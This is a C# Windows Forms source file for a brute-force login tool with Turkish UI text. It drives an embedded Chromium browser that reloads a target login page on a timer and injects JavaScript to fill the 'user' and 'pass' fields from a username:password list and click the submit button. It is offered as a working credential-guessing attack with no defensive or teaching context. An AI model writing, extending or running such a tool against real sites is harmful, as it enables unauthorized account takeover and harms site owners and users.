using BruteForce.Sistem.Models;
using CefSharp;
using CefSharp.WinForms;
using ComponentFactory.Krypton.Toolkit;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BruteForce.Sistem
{
    public partial class frmAna : KryptonForm
    {
        ChromiumWebBrowser browser;
        public frmAna()
        {
            InitializeComponent();
           
        }

        private void FrmAna_FrameLoadEnd(object sender, FrameLoadEndEventArgs e)
        {
            if (e.Frame.IsMain)
            {
                string secilen = bruteList.SelectedItem.ToString();
                string username = secilen.Substring(0, secilen.IndexOf(":"));
                secilen = secilen.Remove(0, secilen.IndexOf(":") + 1);
                string password = secilen;
                e.Frame.ExecuteJavaScriptAsync
                    ($"document.getElementById('user').value = '{username}';");

                e.Frame.ExecuteJavaScriptAsync
                    ($"document.getElementById('pass').value = '{password}';");
                e.Frame.ExecuteJavaScriptAsync
                    ("document.getElementById('button').click();");
              
                if (bruteList.SelectedIndex<bruteList.Items.Count)
                {
                    if (e.HttpStatusCode == 200) bruteList.SelectedIndex++;
                    else
                    {
                        bruteTmr.Stop();
                        stopBtn.Enabled = false;
                        startBtn.Enabled = true;
                        MessageBox.Show("Brute Force Sonlandırıldı", "DURDU");
                    }
                }else
                {
                    bruteTmr.Stop();
                    stopBtn.Enabled = false;
                    startBtn.Enabled = true;
                    MessageBox.Show("Brute Force Sonlandırıldı", "DURDU");
                }
                
            }
        }
        #region Public Definations
        public static List<BruteForceUsers> usersList { get; set; } = null;
        public static BruteForceNavigate navigate { get; set; } = null;
        #endregion
        
        private void startBtn_Click(object sender, EventArgs e)
        {
            if (bruteList.Items.Count <= 0) return;
            //bruteList.Enabled = false;
            bruteList.SelectedIndex = 0;
            startBtn.Enabled = false;
            stopBtn.Enabled = true;
            Control.CheckForIllegalCrossThreadCalls = false;
            CefSettings cefSettings = new CefSettings();
            Cef.Initialize(cefSettings);
            browser = new ChromiumWebBrowser();
            browserPnl.Controls.Add(browser);

            browser.Dock = DockStyle.Fill;
            ((ChromiumWebBrowser)browser).FrameLoadEnd += FrmAna_FrameLoadEnd;
            bruteTmr.Start();
            //bruteList.SelectedIndex = 0;
        }

        private void bruteTmr_Tick(object sender, EventArgs e)
        {
            browser.Load(navigate.Url);
        }

        private void frmAna_Load(object sender, EventArgs e)
        {
          
        }

        private void bilgilerList_Click(object sender, EventArgs e)
        {
            frmBilgiler ac = new frmBilgiler();
            if (ac.ShowDialog() == DialogResult.OK)
            {

            }
            if (usersList != null)
            {
                foreach (var item in usersList)
                {
                    bruteList.Items.Add($"{item.User}:{item.Password}");
                }
            }
        }

        private void stopBtn_Click(object sender, EventArgs e)
        {
            bruteTmr.Stop();
            stopBtn.Enabled = false;
            startBtn.Enabled = true;
        }
    }
}
